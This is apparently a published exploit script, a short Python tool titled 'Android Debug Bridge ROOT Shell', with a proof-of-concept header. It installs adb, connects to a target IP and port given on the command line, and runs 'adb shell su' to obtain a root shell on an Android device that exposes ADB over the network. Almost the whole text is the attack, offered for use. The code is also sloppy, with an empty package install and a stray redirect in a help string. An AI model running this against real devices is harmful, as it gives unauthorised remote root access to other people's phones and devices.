#-------------------------------------------------------------
# Exploit						    
#-------------------------------------------------------------
# Exploit Title: Android Debug Bridge ROOT Shell            
# Exploit Author: Alperen Ergel			       	      
# Date: 15/05/2020					      
# Platform: Android					     
# Type: Remote						       
# Tested on: ln_opi+	   
# CVE : N/A						       
# Description: Should be run as root on any linux os         
#							       -
# * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
# Proof Of Consept [PoC]					
#----------------------------------------------------------------
#								  -
# [*] Trying Connection					  
# connected to [TargetIP]:[TargetPort]			 
#								  -
# [*] Trying To Root Shell					  	
# root@ln_opi+:/ # 						 
#								 
#------------------------------------------------------------------------------
# Usage: python3 exploitadb.py -t/--target [TargetIP] --port [TargetPort]     +
#------------------------------------------------------------------------------

import os
import time
import argparse

# COLORS
G = '\033[1;34m[*] \033[0m'
S = '\033[1;32m[+] \033[0m'
W = '\033[1;33m[!] \033[0m'
ENDC = '\033[0m'

# Required Applications Setups
print(W + "\033[1;35;1mRequired Applications Downloading" + ENDC)

os.system("apt-get update" + "> /dev/null")
os.system("apt-get -y install git" + "> /dev/null")
os.system("apt-get -y install python3" + "> /dev/null")
os.system("apt-get -y install adb" + "> /dev/null")
os.system("apt-get -y install " + "> /dev/null")
print("Done")

# Starting Hacking Part
parser = argparse.ArgumentParser('')
parser.add_argument('-t', "--target", required=True, help='TargetIP' + "> /dev/null")
parser.add_argument('--port', required=True, help='TargetPORT')
args = parser.parse_args()

# Connection The Host
os.system("clear")
print("\n" + G + "\033[1;36;1mTrying Connection" + ENDC)
time.sleep(1)
os.system("adb connect " + args.target + ":" + args.port )

# Connection Root Shell
print("\n" + G + "\033[1;36;1mTrying To Root Shell" + ENDC)
time.sleep(1)
os.system("adb shell su ")
